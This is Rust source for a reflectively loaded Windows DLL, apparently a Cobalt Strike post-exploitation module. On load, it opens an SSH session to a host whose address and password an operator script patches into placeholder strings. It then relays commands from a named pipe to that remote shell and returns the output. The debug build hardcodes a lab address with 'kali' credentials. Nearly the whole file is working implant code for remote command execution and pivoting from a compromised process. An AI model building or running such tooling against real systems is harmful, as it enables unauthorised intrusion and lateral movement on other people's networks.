#![no_main]
#![allow(dead_code)]
#![crate_type = "cdylib"]

mod ffi;
mod pipe;
mod windows;

use std::io::Read;
use crate::pipe::*;

use std::os::raw::c_void;
use windows::*;

use std::net::TcpStream;
use ssh2::Session;

// IPv4 ADDRESS IS STOMPED IN BY .CNA
#[cfg(not(debug_assertions))]
pub static SSH_IPV4_ADDRESS: &[u8; 20] = b"999.999.999.999\0\0\0\0\0";
#[cfg(not(debug_assertions))]
pub static USERNAME_STRING: &[u8; 66] = b"USERNAME_STRING_NO_CHANGE_PLS_USERNAME_STRING_NO_CHANGE_PLS_____\0\0";
#[cfg(not(debug_assertions))]
pub static PASSWORD_STRING: &[u8; 66] = b"PASSWORD_STRING_NO_CHANGE_PLS_PASSWORD_STRING_NO_CHANGE_PLS_____\0\0";

/// Debug config
#[cfg(debug_assertions)]
pub static SSH_IPV4_ADDRESS: &[u8; 20] = b"192.168.0.18\0\0\0\0\0\0\0\0";
#[cfg(debug_assertions)]
pub static USERNAME_STRING: &[u8; 66] = b"kali\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
#[cfg(debug_assertions)]
pub static PASSWORD_STRING: &[u8; 66] = b"kali\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";

const SSH_PORT: u16 = 22;

/// Entry point for the custom Rust-based DLL.
///
/// This function serves as the main entry point for invoking functionality
/// via the Reflective DLL template. As examples, it performs the following operations:
///
/// 1. Displays a message box with a greeting message using the `MessageBoxA` Windows API call.
/// 2. Delegates execution to an external C entry point function (`c_entry`) for further processing.
/// 3. Outputs a message using a named pipe or standard output, depending on the build configuration.
#[unsafe(no_mangle)]
#[allow(named_asm_labels)]
#[allow(non_snake_case, unused_variables)]
pub fn dll_main() {

    let h_input_pipe = match initialize_input_pipe() {
        None => return,
        Some(h) => h,
    };
    let h_output_pipe = match initialize_output_pipe() {
        None => return,
        Some(h) => h,
    };

    // Convert the IP address bytes to string more efficiently
    let ip_address = String::from_utf8_lossy(SSH_IPV4_ADDRESS).clone().trim_end_matches(char::from(0)).to_string();
    let server_address = format!("{}:{}", ip_address, SSH_PORT);

    dbg!(&server_address);

    // Connect to the local SSH server
    let tcp = TcpStream::connect(server_address).unwrap();
    let mut sess = Session::new().unwrap();
    sess.set_tcp_stream(tcp);
    sess.handshake().unwrap();

    // Get username and password from stomped in values
    let username = String::from_utf8_lossy(USERNAME_STRING).clone().trim_end_matches(char::from(0)).to_string();
    let password = String::from_utf8_lossy(PASSWORD_STRING).clone().trim_end_matches(char::from(0)).to_string();

    sess.userauth_password(&*username, &*password).unwrap();

    if sess.authenticated() {
        write_output(h_output_pipe, format!("Authenticated user {}.\n", username).as_str());
    }

    loop{

        let mut channel = sess.channel_session().unwrap();

        let user_input = match read_input(h_input_pipe) {
            None => continue,
            Some(s) => s,
        };

        // Create a null-terminated copy for Windows API calls
        let display_string = format!("{}\0", user_input);

        // Check if the user wants to exit
        if user_input.starts_with("exit") {
            write_output(h_output_pipe, format!("Closing session to {}", ip_address).as_str());
            channel.close().unwrap();
            break;
        }

        // Create a separate string for the command and remove null bytes
        let command: String = user_input.trim().chars().filter(|&c| c != '\0').collect();
        let res = match channel.exec(&command){
            Ok(c) => c,
            Err(e) => {
                let msg = e.to_string();
                write_output(h_output_pipe, format!("Error: {}.\n", msg).as_str());
                continue;
            }
        };

        let mut s = String::new();
        channel.read_to_string(&mut s).unwrap();

        write_output(h_output_pipe, &*s);
    }

    // Close Handles
    unsafe{
        CloseHandle(h_input_pipe);
        CloseHandle(h_output_pipe);
    }
}

/// Retrieves the instruction pointer (IP) on the `x86_64` architecture.
///
/// This function obtains the current value of the instruction pointer (RIP register)
/// using inline assembly. It can be used to determine the memory address of the
/// currently executing instruction, which is helpful for low-level debugging,
/// locating code regions, or working with reflective APIs.
///
/// # Returns
/// A `usize` representing the value of the instruction pointer (RIP).
///
/// # Safety
/// - This function uses inline assembly, which is inherently unsafe.
#[cfg(target_arch = "x86_64")]
unsafe fn get_ip() -> usize {
    let rip: usize;
    unsafe { std::arch::asm!("lea {}, [rip]", out(reg) rip) };
    rip
}

/// Retrieves the instruction pointer (IP) on the `x86` architecture.
///
/// This function obtains the current value of the instruction pointer (EIP register)
/// using inline assembly. It is useful for determining the memory address of the
/// next executing instruction, which aids in low-level debugging, reflective APIs,
/// and locating code regions.
///
/// # Returns
/// A `usize` representing the value of the instruction pointer (EIP).
///
/// # Safety
/// - This function uses inline assembly, which is inherently unsafe.
#[cfg(target_arch = "x86")]
unsafe fn get_ip() -> usize {
    let eip: usize;
    unsafe {
        std::arch::asm!(
        "call 1f",
        "1: pop {}",
        out(reg) eip,
        );
    }

    eip
}

#[unsafe(no_mangle)]
#[allow(named_asm_labels)]
#[allow(non_snake_case, unused_variables, unreachable_patterns)]
pub unsafe extern "system" fn DllMain(
    dll_module: HANDLE,
    call_reason: u32,
    reserved: *mut c_void,
) -> BOOL {
    match call_reason {
        DLL_PROCESS_ATTACH => {
            // Code to run when the DLL is loaded into a process
            // Initialize resources, etc.
            dll_main();
        }
        DLL_THREAD_ATTACH => {
            // Code to run when a new thread is created in the process
        }
        DLL_THREAD_DETACH => {
            // Code to run when a thread exits cleanly
        }
        DLL_PROCESS_DETACH => {
            // Code to run when the DLL is unloaded from the process
            // Clean up resources, etc.
        }
        _ => {}
    }
    return 1;
}
